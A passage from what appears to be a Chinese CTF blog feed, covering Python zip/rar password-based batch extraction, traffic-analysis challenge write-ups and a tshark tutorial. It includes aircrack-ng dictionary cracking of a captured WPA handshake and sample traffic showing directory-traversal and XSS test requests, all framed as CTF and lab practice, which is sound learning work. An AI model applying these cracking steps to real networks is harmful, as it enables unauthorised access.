class="string">&quot;flag.zip&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">print(z.infolist())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> z.infolist():</span><br><span class="line">    print(i.filename,i.CRC)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[&lt;ZipInfo filename=<span class="string">&#x27;flag.png&#x27;</span> compress_type=deflate external_attr=<span class="number">0x20</span> file_size=<span class="number">13642</span> compress_size=<span class="number">1592</span>&gt;]</span><br><span class="line">flag.png <span class="number">1926850634</span></span><br></pre></td></tr></table></figure><h5 id="z-namelist"><a href="#z-namelist" class="headerlink" title="z.namelist()"></a>z.namelist()</h5><p>z.namelist() 会返回压缩包内所有文件名的列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line">z=zipfile.ZipFile(<span class="string">&quot;flag.zip&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">print(z.namelist())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> z.namelist():</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;flag.png&#x27;</span>]</span><br><span class="line">flag.png</span><br></pre></td></tr></table></figure><h5 id="z-read"><a href="#z-read" class="headerlink" title="z.read()"></a>z.read()</h5><p>获取zip文档内指定文件的二进制数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line">z=zipfile.ZipFile(<span class="string">&quot;flag.zip&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">print(z.infolist())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> z.infolist():</span><br><span class="line">    date=z.read(i.filename)</span><br><span class="line">    print(date)</span><br></pre></td></tr></table></figure><p>输出文件的二进制形式，可以通过open函数对文件进行操作，将二进制形式写入文件中。</p><h5 id="z-write"><a href="#z-write" class="headerlink" title="z.write()"></a>z.write()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZipFile.write(filename[, arcname[, compress_type]])</span><br></pre></td></tr></table></figure><p>将指定文件添加到zip文档中。filename为文件路径，arcname为添加到zip文档之后保存的名称, 参数compress_type表示压缩方法，它的值可以是zipfile. ZIP_STORED 或zipfile. ZIP_DEFLATED。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line">z=zipfile.ZipFile(<span class="string">r&quot;steady.zip&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">z.write(<span class="string">&#x27;./flag.png&#x27;</span>,<span class="string">&#x27;steady.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>使用之后会在当前目录生成一个steady.zip的压缩包，压缩包的内容为steady.png。</p><h5 id="z-extract"><a href="#z-extract" class="headerlink" title="z.extract()"></a>z.extract()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZipFile.extract(member[, path[, pwd]])</span><br></pre></td></tr></table></figure><p>将zip文档内的指定文件解压到当前目录。参数member指定要解压的文件名称或对应的ZipInfo对象；参数path指定了解析文件保存的文件夹；参数pwd为解压密码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line">z=zipfile.ZipFile(<span class="string">&quot;steady.zip&quot;</span>)</span><br><span class="line">z.extract(z.namelist()[<span class="number">0</span>],<span class="string">&#x27;./gif/&#x27;</span>)</span><br></pre></td></tr></table></figure><p>注意extract的使用对象是zipfile对象，它提取的文件名字是压缩包内的名字而不是压缩包的名字。</p><h5 id="z-extractall"><a href="#z-extractall" class="headerlink" title="z.extractall()"></a>z.extractall()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZipFile.extractall([path[, members[, pwd]]])</span><br></pre></td></tr></table></figure><p>解压zip文档中的所有文件到当前目录。参数members的默认值为zip文档内的所有文件名称列表，也可以自己设置，选择要解压的文件名称。</p><h2 id="unrar库"><a href="#unrar库" class="headerlink" title="unrar库"></a>unrar库</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>unrar第三方python库是解压rar压缩文件的扩展包，可实现对rar压缩文件的读取、解压等处理。也可以使用unrar这个模块来进行编写rar压缩文件暴力破解。</p><h4 id="使用方式-1"><a href="#使用方式-1" class="headerlink" title="使用方式"></a>使用方式</h4><h5 id="rar对象"><a href="#rar对象" class="headerlink" title="rar对象"></a>rar对象</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unrar <span class="keyword">import</span> rarfile  </span><br><span class="line">rar = rarfile.RarFile(<span class="string">&#x27;flag.rar&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">print(rar)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;unrar.rarfile.RarFile object at <span class="number">0x000002B0FC347880</span>&gt;</span><br></pre></td></tr></table></figure><h5 id="rarfile成员对象函数"><a href="#rarfile成员对象函数" class="headerlink" title="rarfile成员对象函数"></a>rarfile成员对象函数</h5><h6 id="rar-namelist"><a href="#rar-namelist" class="headerlink" title="rar.namelist()"></a>rar.namelist()</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unrar <span class="keyword">import</span> rarfile  </span><br><span class="line">rar = rarfile.RarFile(<span class="string">&#x27;flag.rar&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">print(rar.namelist())</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;flag.png&#x27;</span>]</span><br></pre></td></tr></table></figure><h6 id="rar-printdir"><a href="#rar-printdir" class="headerlink" title="rar.printdir()"></a>rar.printdir()</h6><p>打印rar压缩文件中的文件列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unrar <span class="keyword">import</span> rarfile  </span><br><span class="line">rar = rarfile.RarFile(<span class="string">&#x27;flag.rar&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">rar.printdir()</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">File Name                                             Modified             Size</span><br><span class="line">flag.png                                       <span class="number">2020</span><span class="number">-11</span><span class="number">-01</span> <span class="number">10</span>:<span class="number">11</span>:<span class="number">02</span>        <span class="number">13642</span></span><br></pre></td></tr></table></figure><h6 id="rar-extractall"><a href="#rar-extractall" class="headerlink" title="rar.extractall()"></a>rar.extractall()</h6><p>解压rar压缩文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rf.extract(文件名字, 解压文件存放的路径) </span><br></pre></td></tr></table></figure><h2 id="CTF题目利用"><a href="#CTF题目利用" class="headerlink" title="CTF题目利用"></a>CTF题目利用</h2><h3 id="CMP03-Multiple"><a href="#CMP03-Multiple" class="headerlink" title="CMP03 Multiple"></a>CMP03 Multiple</h3><p>文件名称就是压缩包的密码。使用python批量解压。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> unrar <span class="keyword">import</span> rarfile</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unzip</span>(<span class="params">zipname</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        passwd = zipname[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">        zf = rarfile.RarFile(<span class="string">&#x27;C:/Users/12521/gif/&#x27;</span>+zipname,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        zf.extractall(<span class="string">&#x27;./gif/&#x27;</span>,pwd=passwd)</span><br><span class="line"><span class="comment">#        zf.close()</span></span><br><span class="line">        os.remove(zipname)</span><br><span class="line">        zipname = zf.namelist()[<span class="number">0</span>].replace(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        print(zipname)</span><br><span class="line">unzip(<span class="string">&quot;flag.rar&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="qctl-zip"><a href="#qctl-zip" class="headerlink" title="qctl.zip"></a>qctl.zip</h3><p>同理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile,os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unzip</span>(<span class="params">zipname</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        passwd = zipname.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        zf = zipfile.ZipFile(zipname,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        zf.extractall(pwd=passwd.encode())</span><br><span class="line">        zf.close()</span><br><span class="line">        os.remove(zipname)</span><br><span class="line">        zipname = zf.namelist()[<span class="number">0</span>]</span><br><span class="line">unzip(<span class="string">&quot;qctl.zip&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF-python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-流量分析题2</title>
      <link href="2019/04/09/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%982/"/>
      <url>2019/04/09/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%982/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-流量分析题2"><a href="#CTF-流量分析题2" class="headerlink" title="CTF-流量分析题2"></a>CTF-流量分析题2</h1><h2 id="dhcp-pcap"><a href="#dhcp-pcap" class="headerlink" title="dhcp.pcap"></a>dhcp.pcap</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What IP address is requested by the client?</span><br></pre></td></tr></table></figure><p>Wireshark没有专门用于<em>DHCP</em>流量的内置显示筛选器，但确实具有用于基础协议BOOTP的显示筛选器。</p><p>阅读<code>[Wireshark Wiki的DHCP页面</code>和<code>BOOTP显示过滤器</code>参考我们发现我们可以对BOOTP选项类型进行过滤以仅过滤DHCP请求。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bootp.option.dhcp &#x3D;&#x3D; 3</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/1D3E5A0B-212D-40F7-B2F2-56480E1628D5.png" alt="1D3E5A0B-212D-40F7-B2F2-56480E1628D5"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&lt;192.168.2.244&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is the transaction ID for the DHCP release?</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bootp.option.dhcp &#x3D;&#x3D; 7</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/F1D92743-FC92-4D21-8AAA-1B136399CC18.png" alt="F1D92743-FC92-4D21-8AAA-1B136399CC18"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is the MAC address of the client?</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bootp.option.dhcp &#x3D;&#x3D; 3</span><br></pre></td></tr></table></figure><p>问题1的DHCP请求，我们可以简单地检查数据包详细信息并读取“客户端MAC地址”字段。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/1F1D8AE5-910B-4F84-AC92-6BD1B5EFC406.png" alt="1F1D8AE5-910B-4F84-AC92-6BD1B5EFC406"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&lt;00:0C:29:82:F5:94&gt;</span><br></pre></td></tr></table></figure><h2 id="dns-pcap"><a href="#dns-pcap" class="headerlink" title="dns.pcap"></a>dns.pcap</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is the response for the lookup for flag.fruitinc.xyz?</span><br></pre></td></tr></table></figure><p>检查“数据包详细信息”的“答案”部分，我们发现包含该标志的TXT记录。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/33674F93-C34E-4F9E-8C7F-9DC261E0F69A.png" alt="33674F93-C34E-4F9E-8C7F-9DC261E0F69A"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Which root server responds to the query?</span><br></pre></td></tr></table></figure><p>PCAP中的第一个DNS响应包含DNS根服务器列表。</p><h2 id="backdoor-pcap"><a href="#backdoor-pcap" class="headerlink" title="backdoor++.pcap"></a>backdoor++.pcap</h2><p>分析协议发现有icmp协议，直接搜索flag，每次搜索一个字符，发现在icmp数据包的data字段的第一个十六进制对应flag的每一个字符。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201019211030724.png" alt="image-20201019211030724"></p><p>数据提取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ tshark -r &#x2F;tmp&#x2F;backdoor++.pcap -T fields -Y &quot;icmp&quot; -e &quot;data&quot; &gt; 1.txt</span><br></pre></td></tr></table></figure><p>拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f&#x3D;open(&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1.txt&quot;,&quot;r&quot;)</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in f.readlines():</span><br><span class="line">    if len(i)&#x3D;&#x3D;27:</span><br><span class="line">        flag+&#x3D;chr(int(i[:2],16))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="cacosmia-cap"><a href="#cacosmia-cap" class="headerlink" title="cacosmia.cap"></a>cacosmia.cap</h2><p>无线wifi流量包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ aircrack-ng &#x2F;tmp&#x2F;cacosmia.cap</span><br><span class="line">Opening &#x2F;tmp&#x2F;cacosmia.capait...</span><br><span class="line">Read 4276 packets.</span><br><span class="line"></span><br><span class="line">   #  BSSID              ESSID                     Encryption</span><br><span class="line"></span><br><span class="line">   1  1A:D7:17:98:D0:51  mamawoxiangwantiequan     WPA (1 handshake)</span><br><span class="line"></span><br><span class="line">Choosing first network as target.</span><br><span class="line"></span><br><span class="line">Opening &#x2F;tmp&#x2F;cacosmia.capait...</span><br><span class="line">Read 4276 packets.</span><br><span class="line"></span><br><span class="line">1 potential targets</span><br><span class="line"></span><br><span class="line">Please specify a dictionary (option -w).</span><br><span class="line">破解密码</span><br><span class="line">steady@steady:~$ aircrack-ng &#x2F;tmp&#x2F;cacosmia.cap -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;fern-wifi&#x2F;common.txt</span><br><span class="line">steady@steady:~$ airdecap-ng &#x2F;tmp&#x2F;cacosmia.cap -e mamawoxiangwantiequan -p 12345678</span><br><span class="line">Total number of stations seen            6</span><br><span class="line">Total number of packets read          4276</span><br><span class="line">Total number of WEP data packets         0</span><br><span class="line">Total number of WPA data packets       685</span><br><span class="line">Number of plaintext data packets         0</span><br><span class="line">Number of decrypted WEP  packets         0</span><br><span class="line">Number of corrupted WEP  packets         0</span><br><span class="line">Number of decrypted WPA  packets       538</span><br><span class="line">Number of bad TKIP (WPA) packets         0</span><br><span class="line">Number of bad CCMP (WPA) packets         0</span><br></pre></td></tr></table></figure><p>破解出一个pcap流量包。发现一个post请求有一个图片，图片里面有个压缩包，压缩包里面就是flag，然后发现cookie中JWT有hint，hint提示压缩包密码是ping的网址。所以直接搜索dns协议，找到最后一个地址就是密码。</p><h2 id="铁人三项2018"><a href="#铁人三项2018" class="headerlink" title="铁人三项2018"></a>铁人三项2018</h2><p>第一次攻击是sql注入攻击，攻击IP为202.1.1.2，受害者为192.168.1.8。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201025160906613.png" alt="image-20201025160906613"></p><p>分析其中一个数据包可以得知注入参数为list[select]，使用的工具为sqlmap、版本为1.1.3.2。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201025160801088.png" alt="image-20201025160801088"></p><p>使用wireshark过滤这两个IP的通信。</p><p><code>http and ip.addr == 202.1.1.2 and ip.addr == 192.168.1.8</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF-流量分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tshark的使用</title>
      <link href="2019/04/09/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90--tshark%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>2019/04/09/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90--tshark%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="tshark的使用"><a href="#tshark的使用" class="headerlink" title="tshark的使用"></a>tshark的使用</h1><h2 id="常用选项"><a href="#常用选项" class="headerlink" title="常用选项"></a>常用选项</h2><h3 id="r"><a href="#r" class="headerlink" title="-r"></a>-r</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r 提取如wireshark表格中显示的封包摘要信息</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ tshark -r &#x2F;tmp&#x2F;simple.pcap</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201018094317612.png" alt="image-20201018094317612"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">4752  69.735989        3.4.1 → host         USB 31 URB_INTERRUPT in</span><br><span class="line">4753  69.751990        3.4.1 → host         USB 31 URB_INTERRUPT in</span><br><span class="line">4754  69.767990        3.4.1 → host         USB 31 URB_INTERRUPT in</span><br><span class="line">4755  69.783991        3.4.1 → host         USB 31 URB_INTERRUPT in</span><br><span class="line">4756  69.791992        3.4.1 → host         USB 31 URB_INTERRUPT in</span><br><span class="line">4757  69.799992        3.4.1 → host         USB 31 URB_INTERRUPT in</span><br><span class="line">4758  69.807993        3.4.1 → host         USB 31 URB_INTERRUPT in</span><br><span class="line">4759  69.815993        3.4.1 → host         USB 31 URB_INTERRUPT in</span><br><span class="line">4760  69.823994        3.4.1 → host         USB 31 URB_INTERRUPT in</span><br><span class="line">4761  69.831994        3.4.1 → host         USB 31 URB_INTERRUPT in</span><br><span class="line">4762  69.839995        3.4.1 → host         USB 31 URB_INTERRUPT in</span><br><span class="line">4763  69.847995        3.4.1 → host         USB 31 URB_INTERRUPT in</span><br><span class="line">4764  69.855996        3.4.1 → host         USB 31 URB_INTERRUPT in</span><br><span class="line">4765  69.863996        3.4.1 → host         USB 31 URB_INTERRUPT in</span><br><span class="line">4766  69.887997        3.4.1 → host         USB 31 URB_INTERRUPT in</span><br></pre></td></tr></table></figure><h3 id="Y"><a href="#Y" class="headerlink" title="-Y"></a>-Y</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Y 使用filter过滤器</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ tshark -r &#x2F;tmp&#x2F;1.pcapng -Y &quot;http&quot;</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201018095249678.png" alt="image-20201018095249678"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ tshark -r &#x2F;tmp&#x2F;1.pcapng -Y &quot;http&quot;</span><br><span class="line">    6   2.733155  10.211.55.2 → 10.211.55.15 HTTP 418 GET &#x2F; HTTP&#x2F;1.1 </span><br><span class="line">    9   2.734199 10.211.55.15 → 10.211.55.2  HTTP 479 HTTP&#x2F;1.1 200 OK  (text&#x2F;html)</span><br><span class="line">   11   2.750160  10.211.55.2 → 10.211.55.15 HTTP 439 GET &#x2F;dirtrav&#x2F;example1.php?file&#x3D;hacker.png HTTP&#x2F;1.1 </span><br><span class="line">   39   2.752178 10.211.55.15 → 10.211.55.2  HTTP 1359 HTTP&#x2F;1.1 200 OK  (text&#x2F;html)</span><br><span class="line">   45   2.752432  10.211.55.2 → 10.211.55.15 HTTP 454 GET &#x2F;dirtrav&#x2F;example2.php?file&#x3D;&#x2F;var&#x2F;www&#x2F;files&#x2F;hacker.png HTTP&#x2F;1.1 </span><br><span class="line">   48   2.753155  10.211.55.2 → 10.211.55.15 HTTP 435 GET &#x2F;dirtrav&#x2F;example3.php?file&#x3D;hacker HTTP&#x2F;1.1 </span><br><span class="line">   73   2.754659 10.211.55.15 → 10.211.55.2  HTTP 1360 HTTP&#x2F;1.1 200 OK  (text&#x2F;html)</span><br><span class="line">  100   2.755748 10.211.55.15 → 10.211.55.2  HTTP 1360 HTTP&#x2F;1.1 200 OK  (text&#x2F;html)</span><br><span class="line">  108   7.600648  10.211.55.2 → 10.211.55.15 HTTP 477 GET &#x2F;xss&#x2F;example2.php?name&#x3D;hacker HTTP&#x2F;1.1 </span><br><span class="line">  110   7.601890 10.211.55.15 → 10.211.55.2  HTTP 962 HTTP&#x2F;1.1 200 OK  (text&#x2F;html)</span><br><span class="line">  112   7.731620  10.211.55.2 → 10.211.55.15 HTTP 398 GET &#x2F;favicon.ico HTTP&#x2F;1.1 </span><br><span class="line">  127   7.732494 10.211.55.15 → 10.211.55.2  HTTP 515 HTTP&#x2F;1.1 200 OK  (PNG)</span><br><span class="line">  131  11.272270  10.211.55.2 → 10.211.55.15 HTTP 446 GET &#x2F;xss&#x2F;example2.php?name&#x3D;hacker HTTP&#x2F;1.1 </span><br><span class="line">  132  11.273046 10.211.55.15 → 10.211.55.2  HTTP 961 HTTP&#x2F;1.1 200 OK  (text&#x2F;html)</span><br><span class="line">  154  28.236845  10.211.55.2 → 10.211.55.15 HTTP 484 GET &#x2F;xss&#x2F;example2.php?name&#x3D;%3Cscript%3Ealert(%27tshark%27)%3C&#x2F;script%3E HTTP&#x2F;1.1 </span><br></pre></td></tr></table></figure><h3 id="T"><a href="#T" class="headerlink" title="-T"></a>-T</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">默认text </span><br><span class="line">fields (需要增加-e参数)</span><br><span class="line">其他选项 ek|json|jsonraw|pdml|ps|psml|tabs</span><br></pre></td></tr></table></figure><h3 id="e"><a href="#e" class="headerlink" title="-e"></a>-e</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-e 指定一个字段</span><br></pre></td></tr></table></figure><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>提取Info、Source、Time列</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ tshark -r /tmp/<span class="number">1.</span>pcapng -T fields -e <span class="string">&quot;_ws.col.Source&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ tshark -r &#x2F;tmp&#x2F;1.pcapng -T fields -e &quot;_ws.col.Info&quot;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">GET /sqli/example2.php?name=000 HTTP/1.1 </span><br><span class="line"><span class="number">80</span> → <span class="number">52564</span> [ACK] Seq=<span class="number">1</span> Ack=<span class="number">361</span> Win=<span class="number">6912</span> Len=<span class="number">0</span> TSval=<span class="number">4294962248</span> TSecr=<span class="number">802150771</span></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK  [TCP segment of a reassembled PDU]</span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK  (text/html)</span><br><span class="line"><span class="number">52564</span> → <span class="number">80</span> [ACK] Seq=<span class="number">361</span> Ack=<span class="number">1782</span> Win=<span class="number">129984</span> Len=<span class="number">0</span> TSval=<span class="number">802150773</span> TSecr=<span class="number">4294962249</span></span><br><span class="line"><span class="number">80</span> → <span class="number">52564</span> [FIN, ACK] Seq=<span class="number">1782</span> Ack=<span class="number">361</span> Win=<span class="number">6912</span> Len=<span class="number">0</span> TSval=<span class="number">4294962249</span> TSecr=<span class="number">802150773</span></span><br><span class="line"><span class="number">52564</span> → <span class="number">80</span> [ACK] Seq=<span class="number">361</span> Ack=<span class="number">1783</span> Win=<span class="number">131072</span> Len=<span class="number">0</span> TSval=<span class="number">802150773</span> TSecr=<span class="number">4294962249</span></span><br><span class="line"><span class="number">52564</span> → <span class="number">80</span> [FIN, ACK] Seq=<span class="number">361</span> Ack=<span 